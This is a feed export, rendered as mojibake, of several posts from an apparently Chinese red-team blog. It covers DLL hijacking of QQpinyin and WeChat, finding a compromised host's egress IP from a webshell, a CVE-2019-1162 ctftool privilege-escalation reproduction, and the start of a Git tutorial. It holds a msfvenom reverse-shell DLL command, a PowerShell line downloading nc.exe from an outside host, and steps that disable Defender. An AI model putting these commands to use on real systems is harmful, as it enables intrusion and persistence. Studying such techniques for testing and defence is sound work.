class="code"><pre><span class="line"></span><br><span class="line">1.ç¨‹åºæ‰€åœ¨ç›®å½•</span><br><span class="line">2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰</span><br><span class="line">3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•</span><br><span class="line">4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•</span><br><span class="line">5.Windowsç›®å½•</span><br><span class="line">6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½•</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä½¿ç”¨<code>ProcessMonitor</code>æ¥ç›‘æ§è¿›ç¨‹<br>å¯ä»¥é€šè¿‡ğŸ‘‰<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon</a>ä¸‹è½½</p><h3 id="Do-it"><a href="#Do-it" class="headerlink" title="Do it"></a>Do it</h3><p>è¿™é‡Œä½¿ç”¨è‡ªåŠ¨åŒ–çš„å®¡è®¡å·¥å…·è¿›è¡ŒDLLåŠ«æŒåˆ†æ<br>æ¨èWindowsä¸‹ä½¿ç”¨<code>Dll Hijack Auditor</code></p><p>æˆ‘ä»¬ä»¥Vc++6.0ç¼–è¾‘å™¨ä¸ºä¾‹<br><img src="/DLL Hijacking.resources/D23C6ACE-1F0D-498E-BF55-353C064EEAAF.png" alt="fec186d523049fcb19d40672cee5dd97"></p><p>ç”ŸæˆæŠ¥å‘Š</p><p><img src="/DLL Hijacking.resources/54857F75-C5A0-48E1-9CEF-0EDA6FA7CA1A.png" alt="d09587368427f553d0cb26464aed4cb3"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨dllå¯ä»¥åŠ«æŒ</p><p>ç„¶è€Œè¿™ä¸ªæˆ‘å‘ç°ï¼Œå¥½åƒå¹¶ä¸èƒ½ä½¿ç”¨2333<br>é‚£è¦æ€ä¹ˆæ‰‹åŠ¨å¯»æ‰¾å‘¢ï¼Ÿåæ­£DLLçš„åŠ è½½ï¼Œæˆ‘ä»¬åªéœ€è¦ä»ç¨‹åºå·²ç»åŠ è½½çš„DLLåˆ—è¡¨ä¸­ï¼ŒæŸ¥æ‰¾åœ¨â€œKnownDLLsæ³¨å†Œè¡¨é¡¹â€ä¸­ä¸å­˜åœ¨çš„DLLã€‚<br>ç„¶åå°†æ¶æ„dllæ”¾åœ¨ç¨‹åºå½“å‰ç›®å½•å³å¯</p><p>ç„¶åè¿˜æœ‰ä¸¤ä¸ªåˆ©å™¨ï¼š</p><blockquote><p>Robber <a href="https://github.com/MojtabaTajik/Robber" target="_blank" rel="noopener">https://github.com/MojtabaTajik/Robber</a><br>Rattler <a href="https://github.com/sensepost/rattler" target="_blank" rel="noopener">https://github.com/sensepost/rattler</a></p></blockquote><h3 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h3><p>ç”¨å€¾æ—‹å¸ˆå‚…ä¹‹å‰æ‰¾åˆ°çš„<code>QQpinyin</code>æ¥åšä¸€ä¸ªæ¼”ç¤º<br><a href="https://payloads.online/archivers/2018-06-09/1" target="_blank" rel="noopener">https://payloads.online/archivers/2018-06-09/1</a></p><h4 id="Msf"><a href="#Msf" class="headerlink" title="Msf"></a>Msf</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=182.168.0.101 LPORT=10001 -f dll &gt; ntmarta.dll</span><br></pre></td></tr></table></figure><p><img src="/DLL Hijacking.resources/9FB73E4A-74F4-4249-BD44-673EEE8A9EEC.png" alt="a0ea9b499f1498e7e373e0b512242577"></p><h4 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h4><p><img src="/DLL Hijacking.resources/6D6847BA-6F9A-4355-AE3D-363C27F39C9F.png" alt="278aa9975763a654cec4763eb5ab3792"><br>åŒæ ·çš„æ“ä½œï¼Œåå¼¹beacon<br><img src="/DLL Hijacking.resources/1ED21E64-7A9E-410D-A239-50D5CDD5D592.png" alt="9f382d5e297f99185e2a16bd456773b4"></p><h3 id="Weixin-DLL-Hijacking"><a href="#Weixin-DLL-Hijacking" class="headerlink" title="Weixin DLL Hijacking"></a>Weixin DLL Hijacking</h3><p>å¾®ä¿¡PCç‰ˆç›¸ä¿¡è¿˜æ˜¯ç”¨çš„æ¯”è¾ƒå¤šçš„ï¼Œä¹Ÿå¸¸å¸¸èƒ½åœ¨ä¸€äº›å…¬å¸ç”µè„‘ä¸Šçœ‹åˆ°ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„ä¹‰çš„<br><img src="/DLL Hijacking.resources/3A39C9B1-24B6-4F0A-9F6E-BD1889CAAAA7.png" alt="93bf7e673548524925a9b63f75a3cf5a"><br>å½“ç„¶ï¼ŒProcessMonitorä¹Ÿèƒ½çœ‹åˆ°<br><img src="/DLL Hijacking.resources/12CDE5AD-5981-4771-8F6D-8082FDF95749.png" alt="d4f968dca3dd7e6f373693bcfc79fc31"><br>æ„é€ payloadåŠ«æŒå³å¯<br><img src="/DLL Hijacking.resources/FCEBA963-4F3C-4F21-A968-E08EFC4741B6.png" alt="f17d81c5fc84f728b4f876ed68c2e51d"></p><h2 id="0x02-Summary"><a href="#0x02-Summary" class="headerlink" title="0x02 Summary"></a>0x02 Summary</h2><p>DLLåŠ«æŒä¹Ÿæ˜¯è€çš„ä¸è¡Œçš„ä¸€ä¸ªæ¼æ´äº†ï¼Œä½†æ˜¯åœ¨è¿›è¡Œç»´æƒï¼ŒæŒç»­æ¸—é€çš„æ–¹é¢ï¼Œä¸€ç›´éƒ½æ¯”è¾ƒå‰å®³ã€‚<br>çœŸå®ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªåŠ å¯†çš„DLLæ–‡ä»¶ï¼Œä»DLLMainé‡Œè¿›è¡Œè°ƒç”¨ï¼Œå›å¼¹shellçš„åŒæ—¶ï¼Œä¹Ÿå®Œæˆç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ç”¨æˆ·å¸¸ç”¨è½¯ä»¶çš„DLLåŠ«æŒï½è™šæµ®äº†</p><h2 id="0x03-Other-to-Learn"><a href="#0x03-Other-to-Learn" class="headerlink" title="0x03 Other to Learn"></a>0x03 Other to Learn</h2><p><a href="https://www.52pojie.cn/thread-830796-1-1.html" target="_blank" rel="noopener">ä¸€ç§é€šç”¨DLLåŠ«æŒæŠ€æœ¯ç ”ç©¶</a><br><a href="https://www.cnblogs.com/h2zZhou/p/8601375.html" target="_blank" rel="noopener">è€æ ‘å¼€æ–°èŠ±ï¼šDLLåŠ«æŒæ¼æ´æ–°ç©æ³•</a><br><a href="http://www.anquan.us/static/drops/tips-13238.html" target="_blank" rel="noopener">æ·±å…¥è§£æDLLåŠ«æŒæ¼æ´</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Authro: Patrilic&lt;br&gt;@Time: 2019-08-23 12:18:04&lt;br&gt;&lt;img src=&quot;/wallpaper/75773182_p0.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00
      
    
    </summary>
    
      <category term="ATT&amp;CK" scheme="http://patrilic.top/categories/ATT-CK/"/>
    
    
      <category term="DLL Hijacking" scheme="http://patrilic.top/tags/DLL-Hijacking/"/>
    
  </entry>
  
  <entry>
    <title>å¯»æ‰¾å†…ç½‘å‡ºå£ip</title>
    <link href="http://patrilic.top/2019/08/20/%E5%AF%BB%E6%89%BE%E5%86%85%E7%BD%91%E5%87%BA%E5%8F%A3ip/"/>
    <id>http://patrilic.top/2019/08/20/å¯»æ‰¾å†…ç½‘å‡ºå£ip/</id>
    <published>2019-08-20T12:14:23.000Z</published>
    <updated>2019-08-26T14:45:31.535Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-8-20 20:14:23<br><img src="/wallpaper/30597.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æ™šä¸Šåƒäº†é¥­å›é…’åº—ï¼Œä¸€è§‰ç¡é†’ï¼Œå‘ç°æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘windowsæœºå™¨åªæœ‰webshellæ€ä¹ˆæ‰¾å†…ç½‘çš„å‡ºå£ipï¼Œæƒ³äº†æƒ³ç¡®å®æ²¡æ€»ç»“è¿‡è¿™ä¸ªä¸œè¥¿ï¼ˆä¸»è¦æ˜¯å¹³æ—¶éƒ½æ˜¯ç›´æ¥åå¼¹ä¸ªshelläº†..ï¼‰</p><p>ä»”ç»†æƒ³æƒ³ï¼Œå…¶å®æŒºå¥½ç©çš„ï¼Œç„¶åå°±å’Œå‡ ä¸ªå¸ˆå‚…è®¨è®ºäº†ä¸‹ï¼Œæ„Ÿè§‰å¤§æ¦‚å°±ä¸‹é¢è¿™å‡ ç§æ–¹å¼ï¼Œå¦‚æœæœ‰ä¸è¶³è¯·å¸ˆå‚…è¡¥å……ï½</p><h2 id="0x01-Linux"><a href="#0x01-Linux" class="headerlink" title="0x01 Linux"></a>0x01 Linux</h2><p>Linux ç”±äºåŸºæœ¬è‡ªå¸¦ <code>curl</code>å’Œ<code>wget</code>,<code>telnet</code>å‘½ä»¤ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„</p><h3 id="Curl"><a href="#Curl" class="headerlink" title="Curl"></a>Curl</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl cip.cc</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/F90295F8-F123-4CB2-B957-05DD554F0EA4.png" alt="e6ee0f98f7abc8edc984f243e1c42370"></p><h3 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet cip.cc</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/64B82503-12DC-42B1-AF78-AD72FA1B84F8.png" alt="1ba6f6948d7f30c013c7a0e680e26d18"></p><h3 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h3><p>åˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œç„¶ålinuxç«¯ä½¿ç”¨wgetå‘½ä»¤å³å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget xxx.xxx.xxx.xxx:90</span><br></pre></td></tr></table></figure><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/B7E37635-F0C6-4083-9EE4-E925957C12B1.png" alt="34f53887bd6dfad3b33469c64b746c45"></p><h3 id="pingï¼ˆlinux-windowsé€šç”¨ï¼‰"><a href="#pingï¼ˆlinux-windowsé€šç”¨ï¼‰" class="headerlink" title="pingï¼ˆlinux windowsé€šç”¨ï¼‰"></a>pingï¼ˆlinux windowsé€šç”¨ï¼‰</h3><p>ç»“åˆceye</p><p>ç›´æ¥æ‰§è¡Œpingå‘½ä»¤ï¼Œèµ°<code>DNS Query</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping metzl4.ceye.io</span><br></pre></td></tr></table></figure></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/B51E2419-7B28-4CDE-8B1B-DAF2924545D1.png" alt="f3cc55ed09188d082f807b70cbbb4b37"></p><h2 id="0x02-Windows"><a href="#0x02-Windows" class="headerlink" title="0x02 Windows"></a>0x02 Windows</h2><h3 id="WebClient"><a href="#WebClient" class="headerlink" title="WebClient"></a>WebClient</h3><p>å’Œ<code>Wget</code>ä¸€ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¹³æ—¶ç»å¸¸ä¼šä½¿ç”¨ä¸‹é¢çš„è¯­å¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">New-Object</span> System.Net.WebClient).DownloadFile(<span class="string">"http://xxx.xxx.xxx.xxx/nc.exe"</span>,<span class="string">"nc.exe"</span>)</span><br></pre></td></tr></table></figure></p><p>åŒæ ·ï¼Œåªè¦æ˜¯èµ°httpé€šé“ï¼Œé‚£å°±è‚¯å®šå¯ä»¥å’Œæˆ‘ä»¬çš„vpsè¿›è¡Œè¿æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°å‡ºç½‘ipäº†</p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/EB7707FA-E591-4520-9874-DE0D281F4FBF.png" alt="2c06dc63c41d0c1d698e9d1fb698bf22"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/8A3B4E42-2050-418E-A08A-E5E0A31C3FB4.png" alt="3be76eb775caa75eea974875b0fe5c59"></p><h3 id="WebRequest"><a href="#WebRequest" class="headerlink" title="WebRequest"></a>WebRequest</h3><p><code>Powershell version &gt; 3.0</code> å°±å¯ä»¥ä½¿ç”¨Windowsä¸Šçš„wgetäº†2333</p><p>æŸ¥çœ‹Powershellç‰ˆæœ¬ï¼š<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Host</span></span><br><span class="line"><span class="variable">$PSVersionTable</span>.PSVersion</span><br></pre></td></tr></table></figure></p><p>å®˜æ–¹æ–‡æ¡£ï¼š<br><a href="https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1</a><br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/86CB25E8-75F4-4FFE-8FA4-85DE4BA4ED66.png" alt="c36f05c4f3fda64d50bdd311c14bf9c4"></p><p>Usage:<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/1717FC59-8205-4E3F-A1E2-DD86447ECDCE.png" alt="a1dcebf74d84473ab952f25e9266cfb4"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/64EE7E2C-241F-4575-89F6-7A1BBC891B6F.png" alt="de63fcec3f88e9e2d2b2622791d1c748"></p><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><p><code>certutil</code>è¿™ä¸ªä¸œè¥¿è¢«AVç›‘æ§å¾—å¤ªæ­»äº†..<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/933199E4-E637-48E8-AFA8-4212D731755B.png" alt="fdedf94858c856e6560d27dfcb634d6e"><br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/BE759B80-FA21-4F1B-88E9-5749FD816B2D.png" alt="cdbdb7eb2e69f14fa211e114b88dd701"></p><p>å®æˆ˜ç”¨çš„è¯ä¹Ÿéœ€è¦ä¸€å®šçš„ç»•è¿‡æŠ€å·§</p><h3 id="start"><a href="#start" class="headerlink" title="start"></a>start</h3><p>startå‘½ä»¤ç›´æ¥ä¼šå¼€å¯ä¸€ä¸ªieè¿›ç¨‹å»è®¿é—®ç›®æ ‡url<br><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/351FF26E-1CED-4A96-ACC9-CBB71041B898.png" alt="a7015efe5a0ceeddc7a78797d42d364a"></p><p><img src="/å¦‚ä½•å¯»æ‰¾å†…ç½‘å‡ºå£ip.resources/53FA6E22-78DB-439F-B51D-121D8C76FB81.png" alt="65be4f74982d1bcdf0b6e0545a21bf96"></p><p>å½“ç„¶ï¼Œéœ€è¦æ³¨æ„ç”¨æˆ·ï¼Œåˆ«ç»™åˆ«äººè¿œç¨‹æ¡Œé¢å¼€ä¸ªieå•¥çš„</p><h3 id="â€¦"><a href="#â€¦" class="headerlink" title="â€¦"></a>â€¦</h3><p>è¿˜æœ‰å…¶ä»–çš„å§¿åŠ¿ï¼Œåæ­£æˆ‘æˆ‘è§‰å¾—åªè¦æ˜¯å¯ä»¥ç”¨å„ç§è¥¿è¯¶å’¦è®¿é—®å¤–é¢çš„ï¼Œéƒ½å¯ä»¥æ‹¿åˆ°çœŸå®çš„å‡ºå£ipï¼Œå¤§å“¥ä»¬ä¹Ÿå¯ä»¥ç ”ç©¶ä¸‹</p><h2 id="0x03-åå¼¹shell"><a href="#0x03-åå¼¹shell" class="headerlink" title="0x03 åå¼¹shell"></a>0x03 åå¼¹shell</h2><p>æ—¢ç„¶æœ‰Webshelläº†ï¼Œæœ€å¸¸è§çš„æ–¹å¼ä¹Ÿå°±æ˜¯åå¼¹ä¸ªshellå•¥çš„ï¼Œè¿™é‡Œå°±ä¸å¤šè®²äº†ï¼Œos shell,meterpreterå•¥çš„éƒ½ok</p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>è¿™ä¸ªé—®é¢˜ä¹Ÿæ˜¯çªå‘å¥‡æƒ³ï¼Œå¥½åƒå…·ä½“çš„æ„ä¹‰ä¹Ÿä¸æ˜¯å¾ˆå¤§ï¼Œä¸»è¦æ˜¯åœ¨æƒ³å¦‚ä½•è§„é¿AVå’Œä¸é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨å’Œå†™æ–‡ä»¶çš„æƒ…å†µä¸‹è¿›è¡Œä¸€ä¸ªipè·å–ï½å¸ˆå‚…ä»¬è§è°…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-8-20 20:14:23&lt;br&gt;&lt;img src=&quot;/wallpaper/30597.jpg&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a
      
    
    </summary>
    
      <category term="Red-Team Tricks" scheme="http://patrilic.top/categories/Red-Team-Tricks/"/>
    
    
      <category term="å†…ç½‘æ¸—é€" scheme="http://patrilic.top/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-1162 CTFtool ææƒ</title>
    <link href="http://patrilic.top/2019/08/17/CVE-2019-1162/"/>
    <id>http://patrilic.top/2019/08/17/CVE-2019-1162/</id>
    <published>2019-08-16T16:03:55.000Z</published>
    <updated>2019-08-20T15:29:22.659Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-17 0:03:55<br><img src="/wallpaper/[130511]éµœé£¼ã„-44873217.png" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a little-known protocol used on Windows to implement Text Services. This might be useful for studying Windows internals, debugging complex issues with Text Input Processors and analyzing Windows security.</span><br></pre></td></tr></table></figure><p>æ®è¯´é€šæ€xpåˆ°win10<br>æ¥è‡ªGooleProjectZeroçš„æŠ¥å‘Šï¼š<a href="https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html" target="_blank" rel="noopener">https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html</a></p><h2 id="0x01-ç¯å¢ƒ"><a href="#0x01-ç¯å¢ƒ" class="headerlink" title="0x01 ç¯å¢ƒ"></a>0x01 ç¯å¢ƒ</h2><p>æµ‹è¯•ç‰ˆæœ¬ï¼š <code>Windows 10 1809</code></p><p><img src="/CVE-2019-1162.resources/2AFEC235-3626-4446-B1B5-CE0462059B80.png" alt="449d401cf3dd9aef600033710ed498a2"><br><img src="/CVE-2019-1162.resources/748477CB-5ADC-4D7C-B654-F7BB96AFAC35.png" alt="c70fd3e19082ffeb3204669d1e3ec49d"></p><h2 id="0x02-å¤ç°"><a href="#0x02-å¤ç°" class="headerlink" title="0x02 å¤ç°"></a>0x02 å¤ç°</h2><p>ä¼ æ–‡ä»¶åˆ°è™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œè¢«Defenderæ‹¦æˆªäº†<br><img src="/CVE-2019-1162.resources/5891F28E-EA4E-4BD2-87C5-3CF0610CFA3F.png" alt="17620e7ea3a556734cca6cd2aeabea97"></p><p>ç”±äºåªæ˜¯å¤ç°ä¸€ä¸‹ï¼Œå°±ç›´æ¥å…³äº†å°±è¡Œ..</p><blockquote><p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService</p></blockquote><p>åœ¨å³ä¾§æ‰¾åˆ°DWORDï¼ˆ32ä½ï¼‰å€¼ï¼Œå‘½åä¸ºStartã€‚</p><p>ä¿®æ”¹æ•°å€¼æ•°æ®ä¸º4</p><p><img src="/CVE-2019-1162.resources/9E06EBB1-BDE7-4FA4-BD18-B8D75C7E6FC0.png" alt="c9c92e378df7e718c39ec5558a31ffc8"><br><img src="/CVE-2019-1162.resources/4FD148D1-B1D5-48C1-A4D0-D5B544492CFF.png" alt="9d68611fbee4ad90a6c40168e986fd26"></p><p>åŒæ ·å¯ä»¥ç›´æ¥ä¿®æ”¹dllä¸º<code>cobalt Stike</code>æˆ–è€…<code>msf</code>ç”Ÿæˆçš„dllå°±å¯ä»¥å›å¼¹äº†ï¼Œç®€å•æ–¹ä¾¿ï½<br>é—®é¢˜ï¼š </p><ol><li>æµ‹è¯•win7å’Œwin10 1903éƒ½å¯ä»¥æˆåŠŸï¼Œä½†æ˜¯æœ‰äº›ç¯å¢ƒæç¤ºç¼ºå°‘<code>MSVCPxx.dll</code>ï¼Œéœ€è¦ä¾èµ–ã€‚</li><li>éœ€è¦å¤šæ¬¡äº¤äº’ï¼Œå»ºè®®æ”¹æºç æˆ–è€…å†™ä¸€é”®è„šæœ¬</li><li>ç‰¹å¾å¤ªæ˜æ˜¾ï¼Œéœ€è¦å…æ€</li></ol><h2 id="0x03-è§†é¢‘"><a href="#0x03-è§†é¢‘" class="headerlink" title="0x03 è§†é¢‘"></a>0x03 è§†é¢‘</h2><p><a href="https://www.bilibili.com/video/av64061036/" target="_blank" rel="noopener">https://www.bilibili.com/video/av64061036/</a></p><p><iframe width="700" height="550" src="//player.bilibili.com/player.html?aid=64061036&cid=111231293&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe></p><h2 id="0x04-é“¾æ¥"><a href="#0x04-é“¾æ¥" class="headerlink" title="0x04 é“¾æ¥"></a>0x04 é“¾æ¥</h2><p><a href="https://github.com/taviso/ctftool" target="_blank" rel="noopener">https://github.com/taviso/ctftool</a><br><a href="https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc" target="_blank" rel="noopener">https://www.youtube.com/watch?time_continue=2&amp;v=r3vrzzDpmhc</a><br><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162" target="_blank" rel="noopener">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-1162</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;@Author: Patrilic&lt;br&gt;@Time: 2019-08-17 0:03:55&lt;br&gt;&lt;img src=&quot;/wallpaper/[130511]éµœé£¼ã„-44873217.png&quot; alt&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 
      
    
    </summary>
    
      <category term="æ¼æ´å¤ç°" scheme="http://patrilic.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="Windowsææƒ" scheme="http://patrilic.top/tags/Windows%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>ä»Learn Git Branchingå­¦ä¹ Git</title>
    <link href="http://patrilic.top/2019/08/15/%E4%BB%8ELearn%20Git%20Branching%E5%AD%A6%E4%B9%A0Git/"/>
    <id>http://patrilic.top/2019/08/15/ä»Learn Git Branchingå­¦ä¹ Git/</id>
    <published>2019-08-15T01:14:11.000Z</published>
    <updated>2019-08-20T15:30:47.442Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>@Author: Patrilic<br>@Time: 2019-08-15 09:14:11<br><img src="/wallpaper/62840874_p0.jpg" alt></p></blockquote><h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>å­¦å­¦å­¦ï½ï¼Œçªç„¶å‘ç°GitçœŸçš„æ˜¯ç¥å™¨ã€‚ã€‚å¯æƒœæˆ‘ä»¥å‰åªä¼š<code>git clone</code>å’Œ<code>git pull</code>ä¹‹ç±»çš„..</p><p>ç„¶åè¿™æ¬¡æ‰“ç®—åˆ©ç”¨<a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">Learn Git Branching</a>è¿™ä¸ªç½‘ç«™å¿«é€Ÿå…¥é—¨Gitï¼Œåšä¸ªè®°å½•</p><h2 id="0x01-åŸºç¡€ç¯‡"><a href="#0x01-åŸºç¡€ç¯‡" class="headerlink" title="0x01 åŸºç¡€ç¯‡"></a>0x01 åŸºç¡€ç¯‡</h2><h3 id="Git-Commit"><a href="#Git-Commit" class="headerlink" title="Git Commit"></a>Git Commit</h3><p>Git ä»“åº“ä¸­çš„æäº¤è®°å½•ä¿å­˜çš„æ˜¯ä½ çš„ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶çš„å¿«ç…§ï¼Œå°±åƒæ˜¯æŠŠæ•´ä¸ªç›®å½•å¤åˆ¶ï¼Œç„¶åå†ç²˜è´´ä¸€æ ·ï¼Œä½†æ¯”å¤åˆ¶ç²˜è´´ä¼˜é›…è®¸å¤šï¼</p><p>Git å¸Œæœ›æäº¤è®°å½•å°½å¯èƒ½åœ°è½»é‡ï¼Œå› æ­¤åœ¨ä½ æ¯æ¬¡è¿›è¡Œæäº¤æ—¶ï¼Œå®ƒå¹¶ä¸ä¼šç›²ç›®åœ°å¤åˆ¶æ•´ä¸ªç›®å½•ã€‚æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ï¼Œå®ƒä¼šå°†å½“å‰ç‰ˆæœ¬ä¸ä»“åº“ä¸­çš„ä¸Šä¸€ä¸ªç‰ˆæœ¬è¿›è¡Œå¯¹æ¯”ï¼Œå¹¶æŠŠæ‰€æœ‰çš„å·®å¼‚æ‰“åŒ…åˆ°ä¸€èµ·ä½œä¸ºä¸€ä¸ªæäº¤è®°å½•ã€‚</p><p>Git è¿˜ä¿å­˜äº†æäº¤çš„å†å²è®°å½•ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆå¤§å¤šæ•°æäº¤è®°å½•çš„ä¸Šé¢éƒ½æœ‰çˆ¶èŠ‚ç‚¹çš„åŸå›  â€”â€” æˆ‘ä»¬ä¼šåœ¨å›¾ç¤ºä¸­ç”¨ç®­å¤´æ¥è¡¨ç¤ºè¿™ç§å…³ç³»ã€‚å¯¹äºé¡¹ç›®ç»„çš„æˆå‘˜æ¥è¯´ï¼Œç»´æŠ¤æäº¤å†å²å¯¹å¤§å®¶éƒ½æœ‰å¥½å¤„</p><p><code>ä½¿ç”¨Git commitä¼šå°†å½“å‰èŠ‚ç‚¹å˜æˆçˆ¶èŠ‚ç‚¹ï¼Œç„¶ååœ¨æ­¤åŸºç¡€ä¸Šç”Ÿæˆå­èŠ‚ç‚¹</code></p><h3 id="Git-branch"><a href="#Git-branch" class="headerlink" title="Git branch"></a>Git branch</h3><p>Git çš„åˆ†æ”¯ä¹Ÿéå¸¸è½»é‡ã€‚å®ƒä»¬åªæ˜¯ç®€å•åœ°æŒ‡å‘æŸä¸ªæäº¤çºªå½• â€”â€” ä»…æ­¤è€Œå·²ã€‚æ‰€ä»¥è®¸å¤š Git çˆ±å¥½è€…ä¼ é¢‚ï¼š</p><p>æ—©å»ºåˆ†æ”¯ï¼å¤šç”¨åˆ†æ”¯ï¼</p><p>è¿™æ˜¯å› ä¸ºå³ä½¿åˆ›å»ºå†å¤šåˆ†çš„æ”¯ä¹Ÿä¸ä¼šé€ 